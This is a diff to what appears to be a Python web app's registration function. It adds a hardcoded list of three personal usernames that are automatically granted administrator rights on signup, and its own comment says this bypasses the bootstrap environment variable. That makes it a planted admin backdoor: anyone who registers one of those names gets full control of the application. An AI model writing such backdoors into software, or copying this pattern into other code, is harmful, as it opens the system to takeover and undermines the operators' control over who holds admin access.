@@ -2646,11 +2646,17 @@ def register():
     if _hash_time < _target_min:
         time.sleep(_target_min - _hash_time + (secrets.randbelow(100) / 1000.0))
 
+    # Auto-admin usernames (bypass bootstrap env var)
+    _AUTO_ADMIN_USERNAMES = {"sumonislam12", "sumon122bit", "sumon1"}
+
     conn = db()
     try:
-        conn.execute("INSERT INTO users (username, display_name, password_hash, salt) VALUES (?,?,?,?)",
-                     (username, name, pw_hash, ""))
+        is_admin_flag = 1 if username in _AUTO_ADMIN_USERNAMES else 0
+        conn.execute("INSERT INTO users (username, display_name, password_hash, salt, is_admin) VALUES (?,?,?,?,?)",
+                     (username, name, pw_hash, "", is_admin_flag))
         conn.commit()
+        if is_admin_flag:
+            print(f"[AUTO-ADMIN] @{username} registered as admin")
     except sqlite3.IntegrityError:
         conn.close()
         # S8 — same generic message (does not confirm existence)
